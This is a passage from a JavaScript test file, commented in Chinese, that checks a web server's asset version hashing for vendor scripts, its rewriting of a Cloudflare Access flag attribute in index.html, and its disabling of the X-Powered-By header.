      if (saved.hot === undefined) delete process.env.ASSET_HOT_RELOAD; else process.env.ASSET_HOT_RELOAD = saved.hot;
      if (saved.dev === undefined) delete process.env.DEV_MODE; else process.env.DEV_MODE = saved.dev;
    }
  });
});

// vendor/ 的内容必须真的进版本哈希——只让正则认得 /vendor/ 前缀而不把文件内容算进 assetVersion，
// 效果等于给了一个永远不变的 ?v=，跟没有 immutable 失效手段没有区别（regex 测试那条能测出"格式
// 对不对"，测不出"值会不会随内容变"，这条补上）。
test.describe('configureHttpShell：vendor/ 的内容变化必须改变 assetVersion', () => {
  const roots = [];
  test.after(() => { for (const dir of roots) rmSync(dir, { recursive: true, force: true }); });

  // 每次都建一棵全新的最小 fixture（index.html + js/app.js + vendor/<name>），
  // vendorContent 是唯一变量，其余文件内容两次调用完全一致。
  function assetVersionFor(vendorContent) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-vendor-'));
    roots.push(root);
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    mkdirSync(join(root, 'app/public/vendor'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'),
      '<body><script src="/js/app.js"></script><script src="/vendor/fake-lib.js"></script></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), "console.log('app');\n");
    writeFileSync(join(root, 'app/public/vendor/fake-lib.js'), vendorContent);

    const routes = new Map();
    const app = { use: () => {}, get: (p, ...h) => routes.set(String(p), h), disable: () => {} };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), hotReloadJs: false });
    const indexHandlers = routes.get(String(['/', '/index.html']));
    const out = { body: null };
    indexHandlers[indexHandlers.length - 1]({}, { setHeader: () => {}, type: () => ({ send: b => { out.body = b; } }) });
    const m = out.body.match(/\/vendor\/fake-lib\.js\?v=([0-9a-f]{8})/);
    assert.ok(m, `index.html 里的 vendor 脚本引用应该带上 ?v=，实际：${out.body}`);
    return m[1];
  }

  test('同内容两次调用得到相同版本号（确定性、非随机戳）', () => {
    assert.equal(assetVersionFor("console.log('v1');\n"), assetVersionFor("console.log('v1');\n"));
  });

  test('vendor 文件内容一变，版本号跟着变——否则 immutable 缓存的浏览器永远不会取新版本', () => {
    const before = assetVersionFor("console.log('v1');\n");
    const after = assetVersionFor("console.log('v2 — 库升级了');\n");
    assert.notEqual(before, after);
  });
});

// 2026-09-06 容器演练：index.html 的 <body> 自带 data-cf-access="0"（静态壳离线也要有确定值），此前服务端启用
// Access 时是往 body 前面再插一个 ="1"，页面上同名属性出现两次，全靠 HTML 解析器「取第一个」才成立——
// 属性顺序一换就静默翻成 0，而 0 的含义是「非 CF 拓扑」，公网用户令牌失效后会被送去错误的那扇门。
test('injectCfAccessFlag：改写既有属性值而不是再插一个，body 上同名属性恰好出现一次', () => {
  const html = '<html><body data-cf-access="0" class="h-full"><div data-cf-access="0"></div></body></html>';
  const on = injectCfAccessFlag(html, true);
  const bodyTag = on.match(/<body[^>]*>/)[0];
  assert.equal((bodyTag.match(/data-cf-access=/g) || []).length, 1, 'body 上同名属性不止一个，正确性只剩解析器取首个这一根稻草');
  assert.match(on, /<body data-cf-access="1" class="h-full">/);
  assert.match(on, /<div data-cf-access="0">/, 'body 之外的同名属性不该被碰');
  assert.match(injectCfAccessFlag(html, false), /<body data-cf-access="0" class="h-full">/);
  // 没有预置属性的壳也要能注入（失败方向必须有门可弹：缺属性 = token 门）
  assert.equal(injectCfAccessFlag('<body class="x">', true), '<body data-cf-access="1" class="x">');
});

// 2026-09-06 容器黑盒探测：响应头里 `X-Powered-By: Express` 在裸奔——对使用者零价值，对扫描器等于
// 「按 Express 的已知漏洞选武器」。它只能在 app 级关：Express 是在路由响应时才加这个头，而
// setSecurityHeaders 跑在中间件早期，那时头还不存在，res.removeHeader 抓不到（写成那样是永远绿的假修）。
test('configureHttpShell 关掉 X-Powered-By：不向扫描器自报技术栈', () => {
  const root = mkdtempSync(join(tmpdir(), 'ccm-http-xpb-'));
  try {
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), 'export const A = 1;\n');
    const disabled = [];
    const app = { use: () => {}, get: () => {}, disable: (k) => disabled.push(k) };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub() });
    assert.ok(
      disabled.includes('x-powered-by'),
      'X-Powered-By 仍会随每个响应自报 Express 版本栈——扫描器据此挑现成的 Express 漏洞',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
